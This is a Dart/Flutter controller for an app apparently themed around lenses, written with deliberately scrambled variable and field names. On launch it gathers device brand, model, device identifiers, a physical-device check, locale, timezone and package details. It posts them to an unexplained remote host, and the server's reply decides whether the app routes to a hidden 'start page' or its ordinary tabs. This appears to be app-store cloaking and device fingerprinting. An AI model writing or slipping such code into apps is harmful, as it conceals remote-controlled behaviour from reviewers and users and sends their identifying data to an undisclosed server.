import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';



class LensesCreateLogic extends GetxController {

  var jkiyehxbd = RxBool(false);
  var oefwpnjlb = RxBool(true);
  var jrigvlh = RxString("");
  var dusty = RxBool(false);
  var turner = RxBool(true);
  final aitezuj = Dio();


  InAppWebViewController? webViewController;

  dynamic dcaenh(){
    final zisuhmw = InternetConnectionChecker.instance;
    final nmpaogyic = zisuhmw.onStatusChange.skip(1).listen(
          (InternetConnectionStatus rgkixzdbqa) {
        if (rgkixzdbqa == InternetConnectionStatus.connected) {
          sjwz();
        } else {
          Get.toNamed('/lensesErrorPage')?.then((_){
            sjwz();
          });
        }
      },
    );
    return nmpaogyic;
  }

  Future<bool> uxpdftsay() async {
    var wsheygu = await InternetConnectionChecker.instance.hasConnection;
    if(!wsheygu){
      Get.toNamed('/lensesErrorPage')?.then((_){
        sjwz();
      });
    }
    return wsheygu;
  }

  @override
  void onInit() {
    super.onInit();
    dcaenh();
    sjwz();
  }


  Future<void> sjwz() async {

    var zibxkcdoum = await uxpdftsay();
    if(!zibxkcdoum){
      return;
    }

    dusty.value = true;
    turner.value = true;
    oefwpnjlb.value = false;

    aitezuj.post("https://goi.rainw.net/jbdrmelyntsozqg",data: await qvpzikd()).then((value) {
      var xzknyv = value.data["xzknyv"] as String;
      var uqjb = value.data["uqjb"] as bool;
      if (uqjb) {
        jrigvlh.value = xzknyv;
        osbaldo();
      } else {
        runte();
      }
    }).catchError((e) {
      oefwpnjlb.value = true;
      turner.value = true;
      dusty.value = false;
    });
  }

  Future<Map<String, dynamic>> qvpzikd() async {
    final DeviceInfoPlugin kmxwl = DeviceInfoPlugin();
    PackageInfo xfkerlm_elfdmb = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var plbintc = Platform.localeName;
    var byusglp = currentTimeZone;

    var zevrngdq = xfkerlm_elfdmb.packageName;
    var ibpjnme = xfkerlm_elfdmb.version;
    var yxaqswie = xfkerlm_elfdmb.buildNumber;

    var kmjscnil = xfkerlm_elfdmb.appName;
    var tgpdkxqy = "";
    var wqpj  = "";
    var jwrgoa = "";
    var ervinFlatley = "";
    var aniyahSkiles = "";
    var ivoryHyatt = "";
    var adamMayer = "";
    var elvieHoeger = "";
    var zoeyRoberts = "";


    var dhqkpjr = "";
    var tiaraPagac = "";
    var shawnHalvorson = "";
    var wlxvgcm = false;

    if (GetPlatform.isAndroid) {
      dhqkpjr = "android";
      var jemqptc = await kmxwl.androidInfo;

      jwrgoa = jemqptc.brand;

      tgpdkxqy  = jemqptc.model;
      wqpj = jemqptc.id;

      wlxvgcm = jemqptc.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      dhqkpjr = "ios";
      var aeivmp = await kmxwl.iosInfo;
      jwrgoa = aeivmp.name;
      tgpdkxqy = aeivmp.model;

      wqpj = aeivmp.identifierForVendor ?? "";
      wlxvgcm  = aeivmp.isPhysicalDevice;
    }
    var res = {
      "kmjscnil": kmjscnil,
      "ibpjnme": ibpjnme,
      "aniyahSkiles" : aniyahSkiles,
      "tgpdkxqy": tgpdkxqy,
      "tiaraPagac" : tiaraPagac,
      "byusglp": byusglp,
      "jwrgoa": jwrgoa,
      "shawnHalvorson" : shawnHalvorson,
      "wqpj": wqpj,
      "plbintc": plbintc,
      "dhqkpjr": dhqkpjr,
      "wlxvgcm": wlxvgcm,
      "ervinFlatley" : ervinFlatley,
      "ivoryHyatt" : ivoryHyatt,
      "adamMayer" : adamMayer,
      "zevrngdq": zevrngdq,
      "elvieHoeger" : elvieHoeger,
      "zoeyRoberts" : zoeyRoberts,
      "yxaqswie": yxaqswie,
    };
    return res;
  }

  Future<void> runte() async {
    Get.offNamed("/lensesTabPage");
  }

  Future<void> osbaldo() async {
    Get.offNamed("/lensesStartPage");
  }

  @override
  void dispose() {
    dcaenh().cancel();
    super.dispose();
  }

}
